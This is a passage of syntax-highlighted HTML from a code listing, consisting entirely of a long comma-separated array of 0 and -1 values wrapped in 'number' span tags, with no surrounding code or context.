class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span 